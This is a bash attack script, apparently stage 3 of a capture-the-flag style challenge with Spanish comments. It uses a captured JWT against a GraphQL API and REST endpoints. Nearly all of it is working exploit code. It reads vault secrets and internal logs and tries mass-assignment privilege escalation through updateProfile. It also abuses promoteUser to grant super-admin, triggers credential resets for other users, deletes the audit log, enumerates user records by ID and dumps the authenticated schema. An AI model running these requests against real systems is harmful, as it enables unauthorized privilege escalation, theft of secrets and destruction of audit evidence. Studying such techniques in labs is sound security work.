#!/usr/bin/env bash
# Stage 3 — Privilege escalation
# Pista: "Te diste acceso al sistema que nunca tuvo la intención de conceder"
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWT_FILE="${LOOT_DIR}/stage2_access_token.jwt"
[[ -f "${JWT_FILE}" ]] || { echo "[!] Falta ${JWT_FILE} — corre primero scripts 17/18"; exit 1; }
JWT=$(cat "${JWT_FILE}")

gqla() {
  local q="$1"
  curl -s -X POST "${GQL_URL}" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${JWT}" \
    -d "{\"query\":\"${q}\"}"
}

echo "[1] me — para confirmar quién soy con este JWT"
gqla '{ me { id email displayName role permissions createdAt } }' | jq

echo
echo "[2] users — la query antes era null sin auth, ahora puede listar"
gqla '{ users { id email displayName role permissions } }' | jq

echo
echo "[3] internalLogs — antes redactado, ¿con auth real?"
gqla '{ internalLogs }' | jq

echo
echo "[4] vaultSecrets — directo"
gqla '{ vaultSecrets { id key value classification accessLevel } }' | jq

echo
echo "##############################################"
echo "# Mass assignment intentos en updateProfile"
echo "##############################################"

echo
echo "[5a] updateProfile añadiendo role (no declarado en schema)"
gqla 'mutation { updateProfile(displayName:\"x\", role:\"admin\") { id email role permissions } }' | jq

echo
echo "[5b] updateProfile con permissions extra"
gqla 'mutation { updateProfile(displayName:\"x\", permissions:[\"admin\",\"vault:read\"]) { id email role permissions } }' | jq

echo
echo "[5c] updateProfile completo: role + permissions + isAdmin + scope"
gqla 'mutation { updateProfile(displayName:\"x\", email:\"x@x\", avatar:\"x\", role:\"admin\", permissions:[\"*\"], isAdmin:true, scope:\"admin\") { id email role permissions } }' | jq

echo
echo "[5d] updateProfile con role super-admin"
gqla 'mutation { updateProfile(role:\"super-admin\") { id email role permissions } }' | jq

echo
echo "[5e] updateProfile usando variables (a veces los resolvers parsean diferente)"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"mutation U($r:String){ updateProfile(role:$r) { id email role permissions } }","variables":{"r":"admin"}}' | jq

echo
echo "[5f] updateProfile con input objeto completo (algunos servers aceptan input: { ... })"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"mutation U($i:UserInput){ updateProfile(input:$i) { id email role permissions } }","variables":{"i":{"displayName":"x","role":"admin","permissions":["*"]}}}' | jq

echo
echo "##############################################"
echo "# BFLA en promoteUser"
echo "##############################################"

# Necesitamos un userId. El JWT dice sub:1003 — probemos esa
echo
echo "[6a] promoteUser auto-promo userId=1003 role=admin"
gqla 'mutation { promoteUser(userId:\"1003\", role:\"admin\") { id email role permissions } }' | jq

echo
echo "[6b] promoteUser auto-promo role=super-admin"
gqla 'mutation { promoteUser(userId:\"1003\", role:\"super-admin\") { id email role permissions } }' | jq

echo
echo "[6c] promoteUser sobre id=1 (admin típicamente)"
gqla 'mutation { promoteUser(userId:\"1\", role:\"super-admin\") { id email role permissions } }' | jq

echo
echo "[6d] promoteUser sobre id=admin"
gqla 'mutation { promoteUser(userId:\"admin\", role:\"super-admin\") { id email role permissions } }' | jq

echo
echo "##############################################"
echo "# Otros vectores"
echo "##############################################"

echo
echo "[7] resetCredentials con auth real (antes solo daba OK; con un usuario válido puede leak)"
gqla 'mutation { resetCredentials(userId:\"1003\") }' | jq
gqla 'mutation { resetCredentials(userId:\"1\") }' | jq
gqla 'mutation { resetCredentials(userId:\"admin\") }' | jq

echo
echo "[8] purgeAuditLog — el único bool sin args"
gqla 'mutation { purgeAuditLog }' | jq

echo
echo "[9] /api/v2/users/me con el JWT"
curl -s "${API_URL}/api/v2/users/me" -H "Authorization: Bearer ${JWT}" | jq

echo
echo "[10] /api/v2/users/1003 (BOLA)"
for uid in 1003 1 0 admin 100 1001 1002 1004 1005; do
  echo "--- userId=${uid} ---"
  curl -s "${API_URL}/api/v2/users/${uid}" -H "Authorization: Bearer ${JWT}" -w '\n[%{http_code}]\n'
done

echo
echo "[11] Re-introspection (con auth real puede revelar campos ocultos)"
cat > /tmp/intro_auth.json <<'EOF'
{"query":"{ __schema { types { name kind fields { name args { name type { name kind ofType { name kind } } } type { name kind ofType { name } } } inputFields { name type { name kind ofType { name } } } } } }"}
EOF
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  --data-binary @/tmp/intro_auth.json \
  | tee "${LOOT_DIR}/schema_authed.json" \
  | jq '.data.__schema.types[] | select(.kind=="OBJECT" or .kind=="INPUT_OBJECT") | select(.name | startswith("__") | not)'

echo
echo "[12] Diff vs schema sin auth"
diff <(jq -S '.data.__schema.types | map(.name) | sort' "${LOOT_DIR}/schema_full.json") \
     <(jq -S '.data.__schema.types | map(.name) | sort' "${LOOT_DIR}/schema_authed.json") || true
